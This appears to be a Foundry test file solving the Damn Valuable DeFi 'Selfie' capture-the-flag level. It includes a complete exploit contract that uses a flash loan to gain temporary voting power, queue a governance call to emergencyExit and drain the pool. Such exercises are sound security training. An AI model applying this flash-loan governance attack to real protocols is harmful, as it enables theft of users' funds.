// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal governance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal player;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        player = users[0];

        vm.label(player, "Player");

        // Deploy Damn Valuable Token Snapshot
        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVTSnapshot");

        // Deploy governance contract
        governance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(governance), "Simple Governance");
        assertEq(governance.getActionCounter(), 1);

        // Deploy the pool
        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(governance)
        );
        assertEq(address(selfiePool.token()), address(dvtSnapshot));
        assertEq(address(selfiePool.governance()), address(governance));

        // Fund the pool
        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);
        dvtSnapshot.snapshot();
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);
        assertEq(selfiePool.maxFlashLoan(address(dvtSnapshot)),TOKENS_IN_POOL);
        assertEq(selfiePool.flashFee(address(dvtSnapshot), 0),0);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        vm.startPrank(player);
        vm.warp(block.timestamp + 1 days);
        Exploit exploit = new Exploit(selfiePool, governance, dvtSnapshot);
        exploit.flashLoan();

        vm.warp(block.timestamp + 2 days);
        governance.executeAction(exploit.actionIdQueued());

         vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(player), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}


contract Exploit is IERC3156FlashBorrower {

    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot dvtSnapshot;
    address owner;
    uint256 public actionIdQueued;

    constructor(SelfiePool _pool,
        SimpleGovernance _governance,
        DamnValuableTokenSnapshot _dvtSnapshot) {
            owner = msg.sender;
            pool = _pool;
            governance = _governance;
            dvtSnapshot = _dvtSnapshot;
        }
    
    function flashLoan() external {
        require(msg.sender == owner);
        pool.flashLoan(this, address(dvtSnapshot), dvtSnapshot.balanceOf(address(pool)), "");
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        require(msg.sender == address(pool));
        dvtSnapshot.snapshot();
        actionIdQueued = governance.queueAction(address(pool), 0, abi.encodeWithSelector(pool.emergencyExit.selector, owner));
        dvtSnapshot.approve(address(pool), amount + fee);
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}